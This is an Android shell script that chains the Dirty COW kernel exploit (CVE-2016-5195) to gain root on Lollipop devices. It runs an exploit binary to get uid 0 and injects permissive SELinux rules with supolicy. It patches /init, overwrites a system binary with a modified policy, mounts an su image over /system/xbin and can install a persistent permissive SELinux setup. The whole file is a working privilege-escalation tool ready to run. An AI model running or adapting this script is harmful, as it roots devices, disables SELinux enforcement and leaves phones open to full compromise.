#!/system/bin/sh
WORK_DIR="$(cd $(dirname "$0"); pwd)"
SYS_BIN="/system/bin"
EXPLOIT="$WORK_DIR/run-as-dirtycow"
RUN_AS="/system/bin/run-as"
RUN_AS_PATCHED="$WORK_DIR/run-as-dirtycow"
PATCH="$WORK_DIR/patch-init"
INIT="/init"
INIT_PATCH="$WORK_DIR/init.patch"
INIT_DUMP="$WORK_DIR/init.dump"
INIT_TARGET=""
SEPOLICY="/sepolicy"
SEPOLICY_PERM="$WORK_DIR/sepolicy.perm"
SEPOLICY_TARGET="/system/bin/exfatlabel"
SEPOLICY_DUMP="$WORK_DIR/sepolicy.dump"
SUPOLICY=$WORK_DIR/supolicy
SHELL_EXP=$WORK_DIR/exploit.sh
DMESG="/system/bin/dmesg"
BUSYBOX="$WORK_DIR/busybox"
READELF="$WORK_DIR/readelf"
TAIL="$BUSYBOX tail"
GREP="$BUSYBOX grep"
AWK="$BUSYBOX awk"
TR="$BUSYBOX tr"
OD="$BUSYBOX od"
SED="$BUSYBOX sed"
PRINTF="$BUSYBOX printf"
STAT="$BUSYBOX stat"
CHMOD="$BUSYBOX chmod"
TOUCH="$BUSYBOX touch"
CP="$BUSYBOX cp"
MKDIR="$BUSYBOX mkdir"
KILLALL="$BUSYBOX killall"
SU_SH="$WORK_DIR/pwn.sh"
SU="$WORK_DIR/su"
UEVENT_HELPER="/sys/kernel/uevent_helper"
ROOTED="$WORK_DIR/rooted"
DATA_SECTION_ADDR=""
OPCODE_DATA_SECTION=""
SIZE_NEW_SEPOLICY=""
CUSTOM_FOLDER_SELINUX="/data/security/current"
FILE_CONTEXTS_SELINUX="/file_contexts"
PROPERTY_CONTEXTS_SELINUX="/property_contexts"
SEAPP_CONTEXT_SELINUX="/seapp_contexts"
SELINUX_VERSION_SELINUX="/selinux_version"
SERVICE_CONTEXT_SELINUX="/service_contexts"
MAC_PERMISSIONS_SELINUX="/etc/security/mac_permissions.xml"
DEBUG="0"
INSTALL_PERSISTENT_SELINUX="N"
function getOpcodeDataSection {
        DATA_SECTION_ADDR=`$READELF -S $INIT_DUMP | $GREP -v "\.data\." |$GREP "\.data" | $AWK '{ print $4 }' |  $TR -d 0  `
        FIRST=`echo $DATA_SECTION_ADDR | $AWK '{print substr($0,0,1)}'`
        SECOND=`echo $DATA_SECTION_ADDR | $AWK '{print substr($0,2,1)}'`
	#echo "FIRST: $FIRST"
	#echo "SECOND: $SECOND"
        OPCODE_DATA_SECTION=`$PRINTF "%d" "0x$FIRST$SECOND"`
	#echo "Final opcode:$OPCODE_DATA_SECTION"
}

function getFileNameTargetSepolicy {
        SIZE_NEW_SEPOLICY=`$STAT -c %s $SEPOLICY_PERM`
        for fileBin in /system/bin/*
        do
                size=`$STAT -c %s $fileBin 2>/dev/null`
                if [ "$size" == "" ]
		then		
			continue;
		fi
		if [ "$fileBin" == "/system/bin/busybox" ]
		then
			continue;
		fi
		if [ $size -ge $SIZE_NEW_SEPOLICY ]
                then
                        NAME_BIN=`echo $fileBin | $SED -e "s/\/system\/bin\///"`
                        SIZE_NAME=${#NAME_BIN}
                        if [ $SIZE_NAME -le 10 ]
                        then
                                SEPOLICY_TARGET=$NAME_BIN
                                break;
                        fi
                fi
                #echo "Processing $f"
        done

}

function logit {
	ARG=$1
	if [ "$DEBUG" == "1" ]
	then
        	echo "$ARG"
	fi
}

function do_persistent_selinux_patch {
	echo -n "\033[s\033[1;36m"
	##echo -n "# Install persistent custom selinux (default No) [Yes/No]? \033[s\033[1;31m"
	#read INSTALL_PERSISTENT_SELINUX
	echo -n "\033[s\033[0;34m"
	INSTALL_PERSISTENT_SELINUX="Yes"
	if [ "$INSTALL_PERSISTENT_SELINUX" == "Yes" ]
	then
		run-as -s2 2> /dev/null
        	check_su
	        logit "->Creating folder $CUSTOM_FOLDER_SELINUX"
        	su -c $MKDIR $CUSTOM_FOLDER_SELINUX
                logit "->Copying files"
                su -c $CP $FILE_CONTEXTS_SELINUX $CUSTOM_FOLDER_SELINUX/
 	        su -c $CP $PROPERTY_CONTEXTS_SELINUX $CUSTOM_FOLDER_SELINUX/
                su -c $CP $SEAPP_CONTEXT_SELINUX $CUSTOM_FOLDER_SELINUX/
                su -c $CP $SELINUX_VERSION_SELINUX $CUSTOM_FOLDER_SELINUX/
               	su -c $CP $SERVICE_CONTEXT_SELINUX $CUSTOM_FOLDER_SELINUX/
   	        su -c $CP $SEPOLICY_PERM $CUSTOM_FOLDER_SELINUX/sepolicy
                su -c $CP $MAC_PERMISSIONS_SELINUX $CUSTOM_FOLDER_SELINUX/
		su -c $TOUCH /data/perm.selinux
                su -c $CHMOD 777 /data/perm.selinux
                echo ""
		echo "->Selinux permisive installed"
                echo -n "\033[s\033[1;0m" 
		su
		return;
	fi
}

function make_pwn_script {
	echo "#!/system/bin/sh" > $SU_SH
	echo "echo 1 > $UEVENT_HELPER" >> $SU_SH
	echo "/data/local/tmp/busybox mknod /dev/sutmp b 7 200" >> $SU_SH
	echo "/data/local/tmp/busybox losetup /dev/sutmp /data/local/tmp/su.img" >> $SU_SH
	echo "/data/local/tmp/busybox mount /dev/sutmp /system/xbin/" >> $SU_SH
	echo "/system/bin/chown root:shell /system/xbin" >> $SU_SH
	echo "/system/bin/chcon u:object_r:system_file:s0 /system/xbin" >> $SU_SH
	echo "/system/xbin/su -d" >> $SU_SH
}

function check_su {
	i=0;
	echo -n "\033[s\033[1;36m"
	echo -n "# turn off/on the bluetooth"
	sleep 2 
	am start -n com.android.settings/.wifi.WifiStatusTest > /dev/null 2>&1
	while [  $i -lt 100 ]; do
        	ID=`su -c id 2>/dev/null`
                if [ "$ID" != "" ]
                then
			echo "\033[s\033[0;34m"
			return
		fi
		let i=i+1
        	echo -n "."
		sleep 1
	done
}

echo "\033[2J"
echo "\033[s\033[1;32m              (      )"
echo "\033[s\033[1;32m              ~(^^^^)~"
echo "\033[s\033[1;32m               ) @@ \\~_          |\\"
echo "\033[s\033[1;32m              /     | \\        \\~ /  CVE-2016-5195"
echo "\033[s\033[1;32m             ( 0  0  ) \\        | |   Lollipop (32bits)"
echo "\033[s\033[1;32m              ---___/~  \\       | |   SeLinux bye" 
echo "\033[s\033[1;32m               /'__/ |   ~-_____/ |"
echo "\033[s\033[1;32mo          _   ~----~      ___---~"
echo "\033[s\033[1;32m  O       //     |         |"
echo "\033[s\033[1;32m         ((~\\  _|         -|"
echo "\033[s\033[1;32m   o  O //-_ \\/ |        ~  |"
echo "\033[s\033[1;32m        ^   \_ /         ~  |"
echo "\033[s\033[1;32m               |          ~ |"
echo "\033[s\033[1;32m               |     /     ~ |"
echo "\033[s\033[1;32m               |     (       |"
echo "\033[s\033[1;32m                \\     \\      /\\"
echo "\033[s\033[1;32m               / -_____-\\   \\ ~~-*"
echo "\033[s\033[1;32m               |  /       \\  \\"
echo "\033[s\033[1;32m               / /         / /"
echo "\033[s\033[1;32m             /~  |       /~  |"
echo "\033[s\033[1;32m             ~~~~        ~~~~"

DEBUG=$1
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:.
cd $WORK_DIR
#rm -rf $INIT_PATCH $SEPOLICY_PERM $INIT_DUMP $SEPOLICY_DUMP $ROOTED $SU_SH 2>/dev/null
make_pwn_script
chmod 755 $WORK_DIR/pwn.sh 
chmod 755 $WORK_DIR/busybox
chmod 755 $WORK_DIR/readelf
chmod 755 $WORK_DIR/patch-init
chmod 755 $WORK_DIR/supolicy
chmod 755 $WORK_DIR/libsupol.so
chmod 755 $WORK_DIR/run-as-dirtycow
chmod 755 $WORK_DIR/su.img
chmod 755 $WORK_DIR/run-as-dirtycow64


echo "\033[s\033[1;33m"
echo "# Device:"`getprop ro.product.name`
echo "\033[s\033[0;34m"
echo -n "-Getting uid 0"
$EXPLOIT $RUN_AS $RUN_AS_PATCHED  2>/dev/null &
sleep 5 
$KILLALL run-as-dirtycow 2>/dev/null
sleep 1
echo -n "\033[s\033[1;31m"
echo "->Ok."
echo -n "\033[s\033[0;34m"
echo -n "-Checking permissive run-as."
run-as -s2 2> /dev/null
ENFORCE=`getenforce`
if [ "$ENFORCE" == "Permissive" ]
then
	echo -n "\033[s\033[1;31m"
	echo "->Ok"
	echo -n "\033[s\033[0;34m"
	check_su
	echo -n "\033[s\033[1;0m"
	su
	return
fi

echo -n ""
echo -n "\033[s\033[1;31m"
echo "->No"
echo -n "\033[s\033[0;34m"
echo -n "-Dump policy"
$RUN_AS $SEPOLICY 2> /dev/null  > $SEPOLICY_DUMP
if [ ! -e "$SEPOLICY_DUMP" ]
then
	echo ""
	echo "\033[s\033[1;32m"
	echo "Error dumping sepolicy."
	return
fi
echo -n "\033[s\033[1;31m"
echo "->Ok"
echo -n "\033[s\033[0;34m"
logit "->Generating new sepolicy giving perms to runas"
$SUPOLICY --file $SEPOLICY_DUMP $SEPOLICY_PERM 'allow runas kernel security {setenforce}' > /dev/null
$CP $SEPOLICY_PERM $SEPOLICY_DUMP
$SUPOLICY --file $SEPOLICY_DUMP $SEPOLICY_PERM 'allow vold selinuxfs file {write}' > /dev/null
$CP $SEPOLICY_PERM $SEPOLICY_DUMP
$SUPOLICY --file $SEPOLICY_DUMP $SEPOLICY_PERM 'allow vold kernel security {setenforce}' > /dev/null
$CP $SEPOLICY_PERM $SEPOLICY_DUMP
#XPERIA REQUIRED
$SUPOLICY --file $SEPOLICY_DUMP $SEPOLICY_PERM 'allow untrusted_app platform_analytics_service service_manager {add}' > /dev/null
$CP $SEPOLICY_PERM $SEPOLICY_DUMP
$SUPOLICY --file $SEPOLICY_DUMP $SEPOLICY_PERM 'allow untrusted_app apk_tmp_file file {write}' > /dev/null

echo -n "-Dump init"
$RUN_AS $INIT 2> /dev/null > $INIT_DUMP
if [ ! -e "$INIT_DUMP" ]
then
	echo ""
	echo "\033[s\033[1;31m"
        echo "Error dumping init."
        return
fi
$CP $INIT_DUMP $INIT_PATCH
getFileNameTargetSepolicy
getOpcodeDataSection
INIT_TARGET=`$RUN_AS -f 2> /dev/null`
logit "  Section .data   -> 0x000${DATA_SECTION_ADDR}000"
logit "  Opcode bl offset-> $OPCODE_DATA_SECTION"
logit "  Sepolicy target -> $SEPOLICY_TARGET"
logit "  Init target     -> $INIT_TARGET"
logit "->Patching init.."
$PATCH $INIT_PATCH $SEPOLICY_TARGET $OPCODE_DATA_SECTION &> /dev/null
if [ $? -ne 0 ]
then
	echo ""
	echo "\033[s\033[1;31m"
        echo "Error searching shellcode addr, already patched?"
        return
fi
echo -n "\033[s\033[1;31m"
echo "->Ok"
echo -n "\033[s\033[0;34m"
if [ ! -e "$SEPOLICY_PERM" ]
then
	echo ""
	echo "\033[s\033[1;31m"
        echo "Error new policy not found."
        return
fi
logit "->Copy (dirtycow) our new sepolicy $SEPOLICY_PERM -> $SYS_BIN/$SEPOLICY_TARGET"
echo -n "-Patching sepolicy"
$EXPLOIT $SYS_BIN/$SEPOLICY_TARGET $SEPOLICY_PERM  2>/dev/null & 
sleep 8 
$KILLALL run-as-dirtycow 2>/dev/null
sleep 1
echo -n "\033[s\033[1;31m"
echo "->Ok"
echo -n "\033[s\033[0;34m"
logit "->Copy (dirtycow) our init patched: $INIT_PATCH -> $INIT_TARGET."
if [ ! -e "$INIT_PATCH" ]
then
	echo ""
	echo "\033[s\033[1;31m"
        echo "Error init patch not found."
        return
fi
echo -n "-Patching init"
$EXPLOIT $INIT_TARGET $INIT_PATCH  2>/dev/null & 
sleep 10
$KILLALL run-as-dirtycow 2>/dev/null
logit "->Overwrite init: $INIT_TARGET -> $INIT"
echo -n "\033[s\033[1;31m"
echo "->Ok"
echo -n "\033[s\033[3;36m"
echo -n "# Turn on/off bluetooth please."
echo -n "\033[s\033[0;34m"
$RUN_AS $INIT $INIT_TARGET  2>/dev/null & 
i=0
while [  $i -lt 100 ]; do
	sleep 1 
	SE_LOAD=`$DMESG | $TAIL -100| $GREP -i selinux | $GREP -i rules`
	if [ "$SE_LOAD" != "" ]
	then
		echo -n "\033[s\033[1;31m"
		echo -n "->Ok"
		echo -n "\033[s\033[3;36m"
		echo ""
		do_persistent_selinux_patch
		#echo "->New policy loaded"
		echo "\033[s\033[3;36m"
		echo "# Type run-as -s1 to get a shell"
		echo "# Type run-as -s2 to execute su daemon"
		echo -n "\033[s\033[1;0m"
		return
	fi
	let i=i+1
	echo -n "."
done 

echo ""
echo "# Type run-as -s1 to get a shell"
echo "# Type run-as -s2 to execute su daemon"
return

